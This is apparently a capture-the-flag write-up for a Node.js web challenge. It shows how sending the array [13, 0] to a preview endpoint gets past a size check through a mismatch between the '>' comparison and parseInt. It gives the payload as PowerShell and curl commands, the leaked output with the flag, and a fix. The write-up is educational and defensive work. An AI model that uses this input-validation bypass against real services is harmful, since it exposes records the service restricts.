# Waybill

## Understanding the challenge

|  |  |
| --- | --- |
| Category | Web |
| Event | DPCH Online Qualifiers (Cydea Range platform) |
| Team | Pwnag3 |
| Target | `http://52.146.88.61:37531` (earlier instances: 37201, 37373) |
| Files given | `dist.zip` (Node.js source) |

### What the challenge says

The dispatch office keeps shipment records in a small ledger, and an internal API gives staff a short preview of recent entries. That is the whole description.

It does not tell me where the bug is, but it tells me the shape of the goal. If the API only shows a few records, the flag is almost certainly in a record further down the list. So the question becomes: **what stops me from asking for all of them?**

### A practical warning about the instance

These challenge containers are short-lived. During this solve the port changed three times - `37201`, then `37373`, then `37531` - because each instance expired before I finished. If a command suddenly times out, the instance is dead; go back to the challenge page, start a new one, and use the new port.

There was a second problem. From the Kali box the IP was simply unreachable:

```bash
curl -v --max-time 8 http://52.146.88.61:37373/health
```

```text
*   Trying 52.146.88.61:37373...
* Connection timed out after 8001 milliseconds
curl: (28) Connection timed out after 8001 milliseconds
```

The same request from Windows worked fine, so the rest of this writeup uses PowerShell. The `curl` equivalents are given too, for anyone whose network does reach the host.

### Checking that the service is alive

```powershell
Invoke-WebRequest -Uri "http://52.146.88.61:37531/health" -TimeoutSec 10 -UseBasicParsing
```

Never debug an exploit against a dead box. The health endpoint answers in one line and tells me whether the instance is actually up before I touch anything else.

What the switches do:

- `-TimeoutSec 10` stops it hanging forever when the container is gone.
- `-UseBasicParsing` skips the old Internet Explorer HTML engine. Without it, PowerShell shows a "Script Execution Risk" prompt and waits for you to answer `Y`.

Output:

```text
StatusCode        : 200
StatusDescription : OK
Content           : {"ok":true}
Content-Type: application/json; charset=utf-8
```

The instance is alive. Now I can look at the actual API.

### Seeing a normal reply

```bash
curl -s -X POST http://52.146.88.61:37531/api/preview \
  -H "Content-Type: application/json" \
  -d '{"size": 5}'
```

This was only to see what a valid request and a valid reply look like, before trying anything clever.

- `-X POST` because this endpoint takes data, not a page view.
- `-H "Content-Type: application/json"` so the Node.js server actually parses the body. Without this header many Express apps leave the body empty.
- `-d '{"size": 5}'` asks for five records.

The reply is a list of five ordinary dispatch records, so `size` controls how many entries come back. Asking for a much larger number is rejected with a "preview too large" error, which means there is a size check in the code. Time to read it.

## Reading the source and finding the bug

### Unpacking the code I was given

```bash
unzip dist.zip -d waybill && cd waybill
grep -rn "preview" --include=*.js .
```

The archive is small, and `grep` for the endpoint name takes me straight to the handler instead of me opening every file by hand. `-r` searches every folder below the current one, `-n` prints line numbers, and `--include=*.js` skips `node_modules` noise.

The preview logic boils down to this:

```javascript
function preview(requestedSize) {
  if (requestedSize > 10) {
    return { error: "preview too large" };
  }
  const size = parseInt(requestedSize, 10);
  return ledger.slice(0, size);
}
```

### The two lines that do not agree

Read the function slowly and two things stand out:

1. The only guard is `requestedSize > 10`. It checks the **raw value straight from the JSON body**.
2. The number actually used for slicing comes from `parseInt(requestedSize, 10)`.

So the value is turned into a number **twice, by two different rules**. If I can find an input where those two rules disagree, the guard passes but the slice is big. That is the whole bug.

### Why an array breaks it

JSON lets me send more than plain numbers. Here is what JavaScript does with an array in each place:

```javascript
[13, 0] > 10           // step 1: [13,0] becomes the string "13,0"
                       // step 2: Number("13,0") is NaN
                       // step 3: NaN > 10 is false  -> guard passes

parseInt([13, 0], 10)  // parseInt("13,0", 10)
                       // parseInt reads digits from the left and stops
                       // at the first character it cannot use - the comma
                       // -> 13
```

The `>` operator converts the array to a primitive first, and for an array that means joining it with commas. `"13,0"` is not a valid number, so it becomes `NaN`, and **every comparison with `NaN` is false**. The guard thinks the value is not greater than 10.

`parseInt` is more forgiving. It reads characters from the left as long as they are digits and throws the rest away. It sees `1`, then `3`, then a comma, and stops. It returns `13`.

One gate says "this is not a number at all", the other says "this is 13". That gap is the vulnerability.

The sealed record is entry 13 in the ledger (index 12), so a slice length of 13 is exactly enough.

### The exploit command

```powershell
Invoke-WebRequest -Uri "http://52.146.88.61:37531/api/preview" -Method POST -Body '{"size": [13, 0]}' -ContentType "application/json" -UseBasicParsing | Select-Object -ExpandProperty Content
```

What each part does:

- `-Method POST` matches the endpoint.
- `-Body '{"size": [13, 0]}'` is the payload. The single quotes stop PowerShell from touching the double quotes inside.
- `-ContentType "application/json"` makes the server parse it as JSON instead of form data. Without it the body is ignored and `size` comes out undefined.
- `| Select-Object -ExpandProperty Content` prints only the response body. By default PowerShell prints a big object with headers and cuts the body short, which would hide the flag.

The same thing with curl, if your network reaches the host:

```bash
curl -s -X POST http://52.146.88.61:37531/api/preview \
  -H "Content-Type: application/json" \
  -d '{"size": [13, 0]}'
```

Output:

```json
{"ok":true,"entries":[
  {"id":"D-001","status":"in transit","note":"Dispatch record 1"},
  {"id":"D-002","status":"delivered","note":"Dispatch record 2"},
  ...
  {"id":"D-012","status":"delivered","note":"Dispatch record 12"},
  {"id":"D-013","status":"sealed","note":"web{one_comma_and_the_ledger_opens_55f7564ee46a1794655057YkHANgJe3c7e159a0e91f0e8e3acf39d43eeec77ae58f64f_544}"}
]}
```

Thirteen records came back instead of the maximum ten, and the last one is the sealed entry.

### Flag

```text
web{one_comma_and_the_ledger_opens_55f7564ee46a1794655057YkHANgJe3c7e159a0e91f0e8e3acf39d43eeec77ae58f64f_544}
```

### The fix

Validate the value you are going to use, not a different conversion of it. If the code had written `const size = parseInt(requestedSize, 10)` **first** and then checked `if (size > 10)`, there would be no bug - one value, one rule, one decision.

---

[← All DPCH Online Qualifiers writeups](README.md)
